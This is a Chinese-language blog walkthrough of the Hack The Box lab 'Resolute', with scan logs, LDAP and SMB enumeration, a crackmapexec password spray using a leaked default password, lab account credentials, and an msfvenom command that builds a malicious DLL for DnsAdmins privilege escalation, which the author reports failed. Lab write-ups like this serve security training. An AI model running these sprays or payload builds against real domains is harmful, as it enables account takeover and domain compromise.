---
layout: post
title: HTB——Resolute
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Resolute/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[07:59:51] [INFO] Start IpScan:10.129.73.109
[07:59:51] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[07:59:51] [+] 10.129.73.109:88 open                        
[07:59:51] [+] 10.129.73.109:53 open                        
[07:59:51] [+] 10.129.73.109:135 open                       
[07:59:51] [+] 10.129.73.109:139 open
端口扫描   0% [░░░░░░░░░░░░░░░░░░░░] (215/65535) [0s:2m28s][07:59:51] [+] 10.129.73.109:445 open
[07:59:51] [+] 10.129.73.109:389 open
[07:59:51] [+] 10.129.73.109:593 open
端口扫描   0% [░░░░░░░░░░░░░░░░░░░░] (580/65535) [0s:6s][07:59:51] [+] 10.129.73.109:464 open
[07:59:51] [+] 10.129.73.109:636 open
[07:59:52] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.73.109:389 [0.d.0.w0.&.currentTime1.20250414101434.0Z0.W.subsc]
[07:59:52] [INFO] start LDAP check 10.129.73.109:389
[07:59:52] [+] 开始 LdapScan 任务: LDAP://10.129.73.109:389
[07:59:52] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.73.109:593 [ncacn_http/1.0]                                                                           
[07:59:52] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.73.109:139 [.]
[07:59:52] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.73.109:135 [.@]
[07:59:52] [INFO] start WMI check 10.129.73.109:135
[07:59:52] [+] 开始 WmiExec 任务: WMI://10.129.73.109:135
[07:59:52] [+] 10.129.73.109:3268 open
[07:59:52] [+] 10.129.73.109:3269 open
[07:59:53] [+] 10.129.73.109:5985 open
[07:59:53] [+] 10.129.73.109:9389 open
[07:59:56] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.73.109:3268 [0.d.0.w0.&.currentTime1.20250414101439.0Z0.W.subsc]
[07:59:56] [INFO] start LDAP check 10.129.73.109:3268
[07:59:56] [+] 开始 LdapScan 任务: LDAP://10.129.73.109:3268
[07:59:56] [+] [TCP/KPASSWD5]   10.129.73.109:464         
端口扫描  33% [██████░░░░░░░░░░░░░░] (21873/65535) [0s:1s][07:59:56] [+] [TCP/SMB]  [Windows Server 2016 Standard 14393] 10.129.73.109:445 [hostname: RESOLUTE domain: MEGABANK]                                                                            
[07:59:56] [INFO] start SMB check 10.129.73.109:445
[07:59:56] [+] 开始 SmbScan 任务: SMB://10.129.73.109:445
[07:59:58] [+] [TCP/ADWS]   10.129.73.109:9389 
[07:59:59] [+] [TCP/SPARK]  [Apache Spark] 10.129.73.109:88 [.]
[08:00:00] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.73.109:5985 [Not Found]
[08:00:00] [INFO] start WinRM check 10.129.73.109:5985
[08:00:00] [+] 开始 WinRMScan 任务: WinRM://10.129.73.109:5985
[08:00:02] [+] 10.129.73.109:47001 open                   
[08:00:03] [+] 10.129.73.109:49666 open
[08:00:03] [+] 10.129.73.109:49664 open
[08:00:03] [+] 10.129.73.109:49667 open
[08:00:03] [+] 10.129.73.109:49671 open
[08:00:03] [+] 10.129.73.109:49665 open
[08:00:03] [+] 10.129.73.109:49677 open
[08:00:03] [+] 10.129.73.109:49815 open
[08:00:03] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.73.109:49676 [ncacn_http/1.0]                                                                         
                                                          
[08:00:08] [+] alive ports is: 24
[08:00:08] [+] Ip扫描结束:10.129.73.109
[08:00:08] [INFO] Start UrlScan:http://10.129.73.109:5985
[08:00:08] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.73.109:5985 [Not Found]                                                                           
                                                 
[08:00:08] [+] Url扫描结束:http://10.129.73.109:5985
[08:00:08] [+] 项目任务完成:Default, Timeuse：17.635243488
[08:00:08] [+] 扫描结束,耗时: 18.607502567s

┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-14 07:57:20] [INFO] 暴力破解线程数: 1
[2025-04-14 07:57:20] [INFO] 开始信息扫描
[2025-04-14 07:57:20] [INFO] 最终有效主机数量: 1
[2025-04-14 07:57:20] [INFO] 开始主机扫描
[2025-04-14 07:57:20] [INFO] 有效端口数量: 233
[2025-04-14 07:57:21] [SUCCESS] 端口开放 10.129.73.109:135
[2025-04-14 07:57:21] [SUCCESS] 端口开放 10.129.73.109:88
[2025-04-14 07:57:21] [SUCCESS] 端口开放 10.129.73.109:139
[2025-04-14 07:57:21] [SUCCESS] 端口开放 10.129.73.109:389
[2025-04-14 07:57:21] [SUCCESS] 端口开放 10.129.73.109:445
[2025-04-14 07:57:26] [SUCCESS] 服务识别 10.129.73.109:88 => 
[2025-04-14 07:57:26] [SUCCESS] 服务识别 10.129.73.109:139 =>  Banner:[.]
[2025-04-14 07:57:26] [SUCCESS] 服务识别 10.129.73.109:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: megabank.local, Site: Default-First-Site-Name
[2025-04-14 07:57:26] [SUCCESS] 服务识别 10.129.73.109:445 => 
[2025-04-14 07:58:26] [SUCCESS] 服务识别 10.129.73.109:135 => 
[2025-04-14 07:58:26] [INFO] 存活端口数量: 5
[2025-04-14 07:58:26] [INFO] 开始漏洞扫描
[2025-04-14 07:58:26] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                   
[2025-04-14 07:58:26] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.73.109                                                                          
主机名: Resolute                                                                                 
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.73.109                                                                           
[2025-04-14 07:58:27] [INFO] 系统信息 10.129.73.109 [Windows Server 2016 Standard 14393]
[2025-04-14 08:01:01] [SUCCESS] 扫描已完成: 9/9
```

既然没有我们常规入口点web服务，那我们就只能从windows的其他系统服务下手了。请出`enum4linux`详细打点靶机信息，我们可以得到以下有效数据。

```bash
[+]  Getting domain group memberships:                                                           
                                                                                                 
Group: 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator                         
Group: 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group: 'Contractors' (RID: 1103) has member: MEGABANK\ryan
Group: 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator
Group: 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
Group: 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group: 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group: 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group: 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group: 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group: 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group: 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group: 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group: 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group: 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group: 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group: 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group: 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group: 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group: 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group: 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group: 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group: 'Domain Users' (RID: 513) has member: MEGABANK\per
Group: 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group: 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group: 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group: 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group: 'Domain Users' (RID: 513) has member: MEGABANK\naoki

[+]  Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                              
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]
```

我们再使用`nmap`的`-sCV`标志，来探测域内的一些基本信息，如域名等。

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sCV 10.129.73.109
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 08:08 EDT
Nmap scan report for 10.129.73.109
Host is up (0.16s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-14 10:24:35Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/14%Time=67FCFAE3%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-14T10:24:59
|_  start_date: 2025-04-14T09:59:25
|_clock-skew: mean: 35m46s, deviation: 4h02m31s, median: -1h44m14s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2025-04-14T03:25:02-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds
```

---

# 0x02 LDAP获取域内默认密码

经HTB问题指引我们可知，有一个用户还在使用默认密码。经测试SMB无法匿名使用，那我们只能将突破点转向`LDAP`或`RPC`了。先尝试LDAP：

```bash
┌──(root㉿kali)-[/home/kali/HTB/Resolute]
└─# ldapsearch -x -H ldap://10.129.73.109 -b "DC=megabank,DC=local" | grep 'Password'
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
# Password Settings Container, System, megabank.local
dn: CN=Password Settings Container,CN=System,DC=megabank,DC=local
objectClass: msDS-PasswordSettingsContainer
cn: Password Settings Container
distinguishedName: CN=Password Settings Container,CN=System,DC=megabank,DC=loc
name: Password Settings Container
objectCategory: CN=ms-DS-Password-Settings-Container,CN=Schema,CN=Configuratio
badPasswordTime: 133890993519988217
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=lo
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=lo
# Allowed RODC Password Replication Group, Users, megabank.local
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=megabank,DC=local
cn: Allowed RODC Password Replication Group
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=mega
name: Allowed RODC Password Replication Group
sAMAccountName: Allowed RODC Password Replication Group
# Denied RODC Password Replication Group, Users, megabank.local
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
cn: Denied RODC Password Replication Group
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=megab
name: Denied RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
description: Account created. Password set to Welcome123!
```

通过`grep`指令我们可以看到此机器的默认密码为`Welcome123!`。之前我们通过`rid`获取到了完整的用户列表，那我们尝试密码喷洒，看看会不会有收获

```bash
┌──(root㉿kali)-[/home/kali/HTB/Resolute]
└─# crackmapexec smb 10.129.73.109 -u user.txt -p 'Welcome123!'           
SMB         10.129.73.109   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.73.109   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

拿到了域内的第一个账户`melanie:Welcome123!`。检查发现其可直接登陆上`winrm`至此就拿下了`user.txt`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Resolute/02.png?raw=true)

---

# 0x03 txt文件获取cmd记录

拿下后，我们查看一下此用户的`powershell`记录，看看有没有新发现。我们发现此用户的对应文件夹下竟然没有`powershell`历史文件，那我们转向C盘开始一点点找。可以发现一个隐藏的文件。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Resolute/03.png?raw=true)

从中我们可以获取到一个新账户`Ryan`的账密

```bash'
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

使用此账户登录，我们查看`Ryan`的用户组别与特权。

```bash
Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

我们可以看到`Ryan`用户是属于`DNSAdmins`组内的。我们尝试借助`DNSAdmins`特权来进行权限提升。

- [域渗透 - 利用DnsAdmins提权到SYSTEM-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1816865)

首先我们使用`msfvenom`制作两个恶意dll文件，并将其放在同一目录下。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Resolute]
└─# msfvenom -p windows/x64/exec cmd='net group Domain Admins metanie /add /domain' -f dll > ./addDA.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 312 bytes
Final size of dll file: 9216 bytes
```

一个用于执行恶意指令，一个用于当作跳板。生成完之后可以在当前文件夹下使用`impacket-smbserver`开启SMB服务，接受来自靶机的请求.但最后因环境原因，靶机在SMB远程请求时未能请求到我们SMB共享目录中的恶意dll文件并载入，不了了之。

---